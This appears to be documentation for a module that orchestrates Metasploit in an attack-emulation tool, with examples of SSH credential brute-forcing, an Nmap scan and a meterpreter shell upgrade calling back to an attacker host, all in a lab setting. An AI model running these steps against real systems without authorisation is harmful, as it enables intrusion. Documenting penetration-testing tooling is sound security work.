
## Description
Module orchestrates [Metasploit Framework](https://github.com/rapid7/metasploit-framework).

## Prerequisites
Metasploit must be accessible from Worker it will be executed on.

## Input parameters

=== "Simple"

    ### `module_name`
    Name of Metasploit module.
    
    | Name          | Type   | Required | Default value | Example value                        |
    |---------------|--------|----------|---------------|--------------------------------------|
    | `module_name` | string | &check;  |               | `unix/irc/unreal_ircd_3281_backdoor` |
    
    ### `datastore`
    Datastore options (variables) to use for the execution.  
    Basically an equivalent to `set OPTION value`.
    
    | Name        | Type   | Required | Default value | Example value         |
    |-------------|--------|----------|---------------|-----------------------|
    | `datastore` | object | &cross;  |               | `{"RHOST": "target"}` |

=== "Custom"

    ### `commands`
    Custom set of commands to execute in an order in the Metasploit console.
    
    | Name       | Type            | Required | Default value | Example value                     |
    |------------|-----------------|----------|---------------|-----------------------------------|
    | `commands` | array\[string\] | &check;  |               | `["use multi/handler", "run -z"]` |

### `timeout`
Number of seconds to wait before the module execution will be terminated.

| Name      | Type    | Required | Default value | Example value |
|-----------|---------|----------|---------------|---------------|
| `timeout` | integer | &cross;  |               | `300`         |

## Examples

### SSH login module
Input:
```yaml
module_arguments:
  module_name: scanner/ssh/ssh_login
  datastore:
    RHOSTS: CHANGE_ME
    USERNAME: vagrant
    PASSWORD: vagrant
```

Output:
```json
{
  "result": "ok", 
  "output": "VERBOSE => True\nBRUTEFORCE_SPEED => 5\nBLANK_PASSWORDS => false\nUSER_AS_PASS => false\nDB_ALL_CREDS => false\nDB_ALL_USERS => false\nDB_ALL_PASS => false\nDB_SKIP_EXISTING => none\nSTOP_ON_SUCCESS => false\nREMOVE_USER_FILE => false\nREMOVE_PASS_FILE => false\nREMOVE_USERPASS_FILE => false\nTRANSITION_DELAY => 0\nMaxGuessesPerService => 0\nMaxMinutesPerService => 0\nMaxGuessesPerUser => 0\nCreateSession => true\nAutoVerifySession => true\nTHREADS => 1\nShowProgress => true\nShowProgressPercent => 10\nRPORT => 22\nSSH_IDENT => SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3\nSSH_TIMEOUT => 30\nSSH_DEBUG => false\nGatherProof => true\nRHOSTS => 192.168.56.51\nUSERNAME => vagrant\nPASSWORD => vagrant\nDisablePayloadHandler => True\n[*] 192.168.56.51:22 - Starting bruteforce\n[+] 192.168.56.51:22 - Success: 'vagrant:vagrant' 'uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant) Linux vagrant-ubuntu-trusty-64 3.13.0-170-generic #220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux '\n[!] No active DB -- Credential data will not be saved!\n[*] SSH session 1 opened (192.168.56.50:36169 -> 192.168.56.51:22) at 2022-08-04 17:03:56 +0200\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n",
  "serialized_output": {"session_id": 1} 
}
```

### Running Nmap
```yaml
module_arguments:
  commands:
    - db_nmap --top-ports 100 CHANGE_ME
```

### Upgrade shell session
```yaml
module_arguments:
  module_name: multi/manage/shell_to_meterpreter
  datastore:
    LHOST: {{ attackerHost }}
    SESSION: 1
```

## Troubleshooting
So far so good.

## Output serialization
Only the session ID is serialized.

`serialized_output` contains:

| Parameter name | Parameter description                        |
|----------------|----------------------------------------------|
| `session_id`   | ID of the created session (only if created). |
